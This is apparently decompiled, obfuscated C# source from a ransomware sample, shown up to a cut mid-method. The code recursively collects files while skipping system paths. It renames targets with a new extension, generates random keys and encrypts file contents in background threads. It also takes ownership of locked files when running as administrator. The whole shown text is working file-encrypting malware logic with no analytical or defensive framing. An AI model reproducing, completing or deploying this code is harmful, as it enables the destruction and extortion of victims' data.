using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using LqOmRmSJUuFi;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using XozMYjSIalY;

namespace fAuBSMaVICral;

internal sealed class YpCGOwjDWwATs
{
	public sealed class fWVUPvpddLsRB
	{
		private static StringCollection MhNVRvvscbpW;

		private static List<string> VZwBuiFRjcDdRI;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107366268));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107366263)) && !text.ToLower().Contains(getString_0(107366274)) && !text.ToLower().Contains(getString_0(107351945)) && !text.ToLower().Contains(getString_0(107351388)) && !text.ToLower().Contains(getString_0(107365717)) && !text.ToLower().Contains(getString_0(107351272)) && !text.ToLower().Contains(getString_0(107351213)) && !text.ToLower().Contains(getString_0(107351164)) && !text.ToLower().Contains(getString_0(107351179)) && !text.ToLower().Contains(getString_0(107351642)) && !text.ToLower().Contains(getString_0(107351608)) && !text.ToLower().Contains(getString_0(107351623)) && !text.ToLower().Contains(getString_0(107351574)) && !text.ToLower().Contains(getString_0(107351593)) && !text.ToLower().Contains(getString_0(107351540)) && !text.ToLower().Contains(getString_0(107351559)) && !text.ToLower().Contains(getString_0(107351514)) && !text.ToLower().Contains(getString_0(107351529)) && !text.ToLower().Contains(getString_0(107351480)) && !text.Contains(gUlAYNDfQee(getString_0(107351495))) && !text.Contains(getString_0(107351470)) && !text.Contains(getString_0(107351425)) && !text.EndsWith(getString_0(107411286)) && !text.EndsWith(getString_0(107351432)) && !text.EndsWith(getString_0(107351427)) && !text.EndsWith(getString_0(107350878)) && !text.EndsWith(getString_0(107350873)) && !text.ToLower().Contains(getString_0(107350868)) && !text.ToLower().Contains(tBpNkaUiwdaB))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(ejjizMMXKahuYA) * 1024.0 * 1024.0 && pmiCMuEhoSVg == getString_0(107396886))
							{
								VZwBuiFRjcDdRI.Add(text);
							}
							else if (File.Exists(text) && pmiCMuEhoSVg == getString_0(107396996))
							{
								VZwBuiFRjcDdRI.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return VZwBuiFRjcDdRI;
		}

		static fWVUPvpddLsRB()
		{
			Strings.CreateGetStringDelegate(typeof(fWVUPvpddLsRB));
			MhNVRvvscbpW = new StringCollection();
			VZwBuiFRjcDdRI = new List<string>();
		}
	}

	private sealed class LvzpHEuYptQYCE
	{
		public string FCqnQUJrOVeL;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == FCqnQUJrOVeL;
		}
	}

	private sealed class BZSXgglgClJYZ
	{
		public string sTgNByfgwsvr;

		public bool _003CIsDriveNTFS_003Eb__17(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == sTgNByfgwsvr;
		}
	}

	private sealed class aqfJbcykYejZmwL
	{
		private sealed class CgHgUAKNLwPjI
		{
			public aqfJbcykYejZmwL jqsVSiuWHs;

			public string kaNVvzwzDsJ;

			public void _003CCrypt_003Eb__21()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					XVacNoFQjahs(WindowsIdentity.GetCurrent().Name, kaNVvzwzDsJ);
				}
			}

			public void _003CCrypt_003Eb__22()
			{
				IUcmtFtUFChzRCv(kaNVvzwzDsJ, jqsVSiuWHs.UCbzoZncBa, jqsVSiuWHs.IBbAAFpKOswdk, jqsVSiuWHs.NcuKpGJnmmL, jqsVSiuWHs.inbNUQoaoLp);
			}
		}

		public string[] UCbzoZncBa;

		public string[] NcuKpGJnmmL;

		public string inbNUQoaoLp;

		public string IBbAAFpKOswdk;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__20(string string_0)
		{
			CgHgUAKNLwPjI CS_0024_003C_003E8__locals0 = new CgHgUAKNLwPjI();
			CS_0024_003C_003E8__locals0.jqsVSiuWHs = this;
			CS_0024_003C_003E8__locals0.kaNVvzwzDsJ = string_0;
			if (hkbsCfPIIfG && !eXbSvlDLJLqL().Contains(getString_0(107349610)) && !eXbSvlDLJLqL().Contains(getString_0(107365739)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						XVacNoFQjahs(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.kaNVvzwzDsJ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (pPfoNHLnIlcgVkwJ == getString_0(107396893))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					IUcmtFtUFChzRCv(CS_0024_003C_003E8__locals0.kaNVvzwzDsJ, CS_0024_003C_003E8__locals0.jqsVSiuWHs.UCbzoZncBa, CS_0024_003C_003E8__locals0.jqsVSiuWHs.IBbAAFpKOswdk, CS_0024_003C_003E8__locals0.jqsVSiuWHs.NcuKpGJnmmL, CS_0024_003C_003E8__locals0.jqsVSiuWHs.inbNUQoaoLp);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				IUcmtFtUFChzRCv(CS_0024_003C_003E8__locals0.kaNVvzwzDsJ, UCbzoZncBa, IBbAAFpKOswdk, NcuKpGJnmmL, inbNUQoaoLp);
			}
		}

		static aqfJbcykYejZmwL()
		{
			Strings.CreateGetStringDelegate(typeof(aqfJbcykYejZmwL));
		}
	}

	private sealed class rMKsTJZgha
	{
		private sealed class WpJNwmODutnr
		{
			public rMKsTJZgha aXSAfIkYbfct;

			public string DTaZlHbaazgUn;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				try
				{
					if (sHBjpbgVmkra)
					{
						Console.WriteLine(getString_0(107365795) + DTaZlHbaazgUn + getString_0(107365692) + new FileInfo(DTaZlHbaazgUn).Length + getString_0(107365639));
						Console.WriteLine(getString_0(107365226), aAbwlpshQJNC.Count, iRDeCsZxbW, YZVmksVDGrCDMh);
						Console.WriteLine(getString_0(107365169), zTfquIuAKrE.Elapsed);
						Console.WriteLine(getString_0(107365662));
					}
				}
				catch
				{
				}
			}

			static WpJNwmODutnr()
			{
				Strings.CreateGetStringDelegate(typeof(WpJNwmODutnr));
			}
		}

		private sealed class ocqbuZDEbXSyG
		{
			public WpJNwmODutnr xmJqGZaQzny;

			public rMKsTJZgha aXSAfIkYbfct;

			public string sAdHiECMzxLH;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in RpGcCAInLIz)
				{
					if (sAdHiECMzxLH.ToLower().EndsWith(item + aXSAfIkYbfct.QxykwlAceQFylEg) && ymVKGiHEgE == getString_0(107396908))
					{
						if (Convert.ToInt32(MJsJJqYMMt) * 1024 * 1024 > new FileInfo(sAdHiECMzxLH).Length)
						{
							try
							{
								mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352667), getString_0(107352630), getString_0(107352617), sAdHiECMzxLH);
							}
							catch
							{
							}
						}
					}
					else if (sAdHiECMzxLH.ToLower().EndsWith(item) && ymVKGiHEgE == getString_0(107397018))
					{
						try
						{
							mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352667), getString_0(107352630), getString_0(107352617), sAdHiECMzxLH);
						}
						catch
						{
						}
					}
				}
			}

			static ocqbuZDEbXSyG()
			{
				Strings.CreateGetStringDelegate(typeof(ocqbuZDEbXSyG));
			}
		}

		private sealed class yNAeEToLAJLz
		{
			public rMKsTJZgha aXSAfIkYbfct;

			public string DTaZlHbaazgUn;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				try
				{
					if (sHBjpbgVmkra)
					{
						Console.WriteLine(getString_0(107365802) + DTaZlHbaazgUn + getString_0(107365699) + new FileInfo(DTaZlHbaazgUn).Length + getString_0(107365646));
						Console.WriteLine(getString_0(107365233), aAbwlpshQJNC.Count, iRDeCsZxbW, YZVmksVDGrCDMh);
						Console.WriteLine(getString_0(107365176), zTfquIuAKrE.Elapsed);
						Console.WriteLine(getString_0(107365669));
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__34()
			{
				foreach (string item in RpGcCAInLIz)
				{
					if (DTaZlHbaazgUn.ToLower().EndsWith(item + aXSAfIkYbfct.QxykwlAceQFylEg) && ymVKGiHEgE == getString_0(107396911))
					{
						if (Convert.ToInt32(MJsJJqYMMt) * 1024 * 1024 > new FileInfo(DTaZlHbaazgUn).Length)
						{
							try
							{
								mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352670), getString_0(107352633), getString_0(107352620), DTaZlHbaazgUn);
							}
							catch
							{
							}
						}
					}
					else if (DTaZlHbaazgUn.ToLower().EndsWith(item) && ymVKGiHEgE == getString_0(107397021))
					{
						try
						{
							mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352670), getString_0(107352633), getString_0(107352620), DTaZlHbaazgUn);
						}
						catch
						{
						}
					}
				}
			}

			static yNAeEToLAJLz()
			{
				Strings.CreateGetStringDelegate(typeof(yNAeEToLAJLz));
			}
		}

		public List<string> QtmvuwZlumLl;

		public List<string> irMLgePJDX;

		public string QxykwlAceQFylEg;

		public string[] boaEQxNXtIuKCtPO;

		public string MKXSGZQsex;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2f(string string_0)
		{
			using List<string>.Enumerator enumerator = irMLgePJDX.GetEnumerator();
			ocqbuZDEbXSyG CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				WpJNwmODutnr CS_0024_003C_003E8__locals1 = new WpJNwmODutnr();
				CS_0024_003C_003E8__locals1.aXSAfIkYbfct = this;
				CS_0024_003C_003E8__locals1.DTaZlHbaazgUn = enumerator.Current;
				if (CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107352003)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351978)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351945)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351960)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351403)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351410)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351389)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351344)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351331)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351326)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351317)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351268)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351242)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351253)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351228)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351179)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351194)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351657)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351672)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351623)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351638)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351589)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351608)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351555)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351574)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351529)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351544)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351495)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(gUlAYNDfQee(getString_0(107351510))) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351485)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107397151)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107351440)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(QxykwlAceQFylEg) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(getString_0(107351447)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(getString_0(107351442)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(getString_0(107350893)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(getString_0(107350888)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(getString_0(107350883)) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(tBpNkaUiwdaB) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(kZGwVMpcMFQGdu) || CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(BVDNRoTnEzf))
				{
					continue;
				}
				if (boaEQxNXtIuKCtPO.Length != 0)
				{
					string[] array = boaEQxNXtIuKCtPO;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1119;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(QxykwlAceQFylEg))
					{
						goto IL_1119;
					}
				}
				catch (Exception)
				{
					goto IL_1119;
				}
				if (!CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(string_0) || aAbwlpshQJNC.Contains(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn))
				{
					continue;
				}
				if (kdgdQzLhNzqB == getString_0(107396901))
				{
					try
					{
						if (mnpRWvvbrJgHv.cJzqbOCqGLtS(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn))
						{
							mnpRWvvbrJgHv.WtlWQnLheONJif(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
						}
					}
					catch
					{
					}
				}
				aAbwlpshQJNC.Add(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (sHBjpbgVmkra)
						{
							Console.WriteLine(WpJNwmODutnr.getString_0(107365795) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + WpJNwmODutnr.getString_0(107365692) + new FileInfo(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn).Length + WpJNwmODutnr.getString_0(107365639));
							Console.WriteLine(WpJNwmODutnr.getString_0(107365226), aAbwlpshQJNC.Count, iRDeCsZxbW, YZVmksVDGrCDMh);
							Console.WriteLine(WpJNwmODutnr.getString_0(107365169), zTfquIuAKrE.Elapsed);
							Console.WriteLine(WpJNwmODutnr.getString_0(107365662));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!AknjtLUSQgBf.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn)))
				{
					AknjtLUSQgBf.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn));
				}
				bHpvAtayIadi(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
				try
				{
					new OAxPYfdUYtB().kBVxeUnZtOC(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (sHBjpbgVmkra)
							{
								Console.WriteLine(getString_0(107365702) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + getString_0(107365689) + new FileInfo(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn).Length + getString_0(107365636));
								Console.WriteLine(getString_0(107365659));
							}
						}
						catch
						{
						}
						pPOxzMkmHSA(gUlAYNDfQee(getString_0(107365554)), getString_0(107350799) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + getString_0(107350799) + gUlAYNDfQee(getString_0(107365529)) + getString_0(107350799) + Environment.UserName + getString_0(107350799) + gUlAYNDfQee(getString_0(107365992)));
					}
				}
				catch (Exception ex2)
				{
					if (IOdNTzsqoZWVAC)
					{
						try
						{
							File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349240) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + getString_0(107365967) + ex2.Message + getString_0(107396673));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (IOdNTzsqoZWVAC)
						{
							try
							{
								File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349240) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + getString_0(107365918) + ex4.Message + getString_0(107396673));
							}
							catch (Exception)
							{
							}
						}
						YZVmksVDGrCDMh++;
						goto end_IL_08ba;
					}
					if (dHRyeOBeWtyqJR == getString_0(107396901) && new FileInfo(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn).Length > Convert.ToInt32(XaBojWlRQDbFIzp) * 1024 * 1024 && !QtmvuwZlumLl.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new ocqbuZDEbXSyG();
						CS_0024_003C_003E8__locals0.xmJqGZaQzny = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.aXSAfIkYbfct = this;
						try
						{
							if (QxykwlAceQFylEg != getString_0(107349478))
							{
								if (gmYGIhcbzDElW)
								{
									QxykwlAceQFylEg = lEGlvoOLHlud + QxykwlAceQFylEg;
								}
								File.Move(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg);
							}
						}
						catch (Exception ex6)
						{
							if (IOdNTzsqoZWVAC)
							{
								try
								{
									File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349240) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + getString_0(107365825) + ex6.Message + getString_0(107396673));
								}
								catch (Exception)
								{
								}
							}
							YZVmksVDGrCDMh++;
							goto end_IL_08ba;
						}
						CS_0024_003C_003E8__locals0.sAdHiECMzxLH = getString_0(107352547);
						if (QxykwlAceQFylEg != getString_0(107349478))
						{
							CS_0024_003C_003E8__locals0.sAdHiECMzxLH = CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg;
						}
						else
						{
							CS_0024_003C_003E8__locals0.sAdHiECMzxLH = CS_0024_003C_003E8__locals1.DTaZlHbaazgUn;
						}
						if (ttlCPfUMAnPPn == getString_0(107396901))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in RpGcCAInLIz)
								{
									if (CS_0024_003C_003E8__locals0.sAdHiECMzxLH.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.aXSAfIkYbfct.QxykwlAceQFylEg) && ymVKGiHEgE == ocqbuZDEbXSyG.getString_0(107396908))
									{
										if (Convert.ToInt32(MJsJJqYMMt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.sAdHiECMzxLH).Length)
										{
											try
											{
												mYaTrXhnsaDz.jPGIJOflxVN(ocqbuZDEbXSyG.getString_0(107352667), ocqbuZDEbXSyG.getString_0(107352630), ocqbuZDEbXSyG.getString_0(107352617), CS_0024_003C_003E8__locals0.sAdHiECMzxLH);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.sAdHiECMzxLH.ToLower().EndsWith(item) && ymVKGiHEgE == ocqbuZDEbXSyG.getString_0(107397018))
									{
										try
										{
											mYaTrXhnsaDz.jPGIJOflxVN(ocqbuZDEbXSyG.getString_0(107352667), ocqbuZDEbXSyG.getString_0(107352630), ocqbuZDEbXSyG.getString_0(107352617), CS_0024_003C_003E8__locals0.sAdHiECMzxLH);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						string text = lOiJKLXYNaE.EUcJjWziQBK(32);
						string text2 = getString_0(107352547);
						text2 = (JsBIHINLdKrOq ? lOiJKLXYNaE.sKpHBCLYxr() : getString_0(107352547));
						string s = jHvXcQAocngrZWa.UXBKErjXJpX(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (fRCrnusObo == getString_0(107397011))
						{
							byte[] array2 = null;
							byte[] byte_ = kkKbYndBNVRIq.IVisBGGKLwj(CS_0024_003C_003E8__locals0.sAdHiECMzxLH, Convert.ToInt32(XaBojWlRQDbFIzp) * 1024 * 1024);
							if (kkKbYndBNVRIq.cOUmRprntfS(fWbWouVUtQb: (!ZdrpEPuTKVdNM) ? (JsBIHINLdKrOq ? kkKbYndBNVRIq.ZhgCAqtDUPafD(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kkKbYndBNVRIq.ZhgCAqtDUPafD(byte_, Convert.FromBase64String(MKXSGZQsex), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (JsBIHINLdKrOq ? ljGMsJUyXoVokMGC.ktwhezfiBVAUNLi(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : ljGMsJUyXoVokMGC.ktwhezfiBVAUNLi(byte_, Convert.FromBase64String(MKXSGZQsex), Convert.FromBase64String(tHaxFjXwOLKb))), mMkGcFwOyALFJP: CS_0024_003C_003E8__locals0.sAdHiECMzxLH, wNHkPJFScGyAC: bytes))
							{
								goto IL_1119;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
							}
							catch (Exception)
							{
							}
						}
						else if (!JsBIHINLdKrOq)
						{
							if (EBBCbHTQPFk.RLENGbvKOVkQ(CS_0024_003C_003E8__locals0.sAdHiECMzxLH, XaBojWlRQDbFIzp, MKXSGZQsex, null, Convert.FromBase64String(tHaxFjXwOLKb)))
							{
								goto IL_1119;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (EBBCbHTQPFk.RLENGbvKOVkQ(CS_0024_003C_003E8__locals0.sAdHiECMzxLH, XaBojWlRQDbFIzp, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_1119;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (gmYGIhcbzDElW)
					{
						QxykwlAceQFylEg = lEGlvoOLHlud + QxykwlAceQFylEg;
					}
					string text3 = lOiJKLXYNaE.EUcJjWziQBK(32);
					string text4 = getString_0(107352547);
					text4 = (JsBIHINLdKrOq ? lOiJKLXYNaE.sKpHBCLYxr() : getString_0(107352547));
					string s2 = jHvXcQAocngrZWa.UXBKErjXJpX(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (QxykwlAceQFylEg != getString_0(107349478))
					{
						if (!XRrWKEvMyEJKuU)
						{
							if (!JsBIHINLdKrOq)
							{
								rVYEpwebTUtQK(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg, LkftepqeXsefTk);
							}
							else
							{
								rVYEpwebTUtQK(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!JsBIHINLdKrOq)
								{
									GiEPJrlkxkyBC(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg, LkftepqeXsefTk, Convert.FromBase64String(tHaxFjXwOLKb));
								}
								else
								{
									GiEPJrlkxkyBC(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (IOdNTzsqoZWVAC)
								{
									try
									{
										File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349240) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + getString_0(107349496) + ex11.Message + getString_0(107396673));
									}
									catch (Exception)
									{
									}
								}
								YZVmksVDGrCDMh++;
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
								}
								catch (Exception)
								{
								}
								goto end_IL_08ba;
							}
						}
					}
					else if (!XRrWKEvMyEJKuU)
					{
						if (!JsBIHINLdKrOq)
						{
							rVYEpwebTUtQK(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + getString_0(107349473), LkftepqeXsefTk);
						}
						else
						{
							rVYEpwebTUtQK(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + getString_0(107349473), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!JsBIHINLdKrOq)
							{
								GiEPJrlkxkyBC(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, LkftepqeXsefTk, Convert.FromBase64String(tHaxFjXwOLKb));
							}
							else
							{
								GiEPJrlkxkyBC(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (IOdNTzsqoZWVAC)
							{
								try
								{
									File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349240) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + getString_0(107349496) + ex14.Message + getString_0(107396673));
								}
								catch (Exception)
								{
								}
							}
							YZVmksVDGrCDMh++;
							goto end_IL_08ba;
						}
					}
					if (JsBIHINLdKrOq)
					{
						if (QxykwlAceQFylEg != getString_0(107349478))
						{
							LoqGoLvZhSEzLPF(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + QxykwlAceQFylEg, bytes2);
						}
						else
						{
							LoqGoLvZhSEzLPF(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, bytes2);
						}
					}
					goto IL_1119;
					end_IL_08ba:;
				}
				catch (Exception)
				{
					goto IL_1119;
				}
				continue;
				IL_1119:
				irMLgePJDX.Remove(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
			}
		}

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			yNAeEToLAJLz CS_0024_003C_003E8__locals0 = new yNAeEToLAJLz();
			CS_0024_003C_003E8__locals0.aXSAfIkYbfct = this;
			CS_0024_003C_003E8__locals0.DTaZlHbaazgUn = string_0;
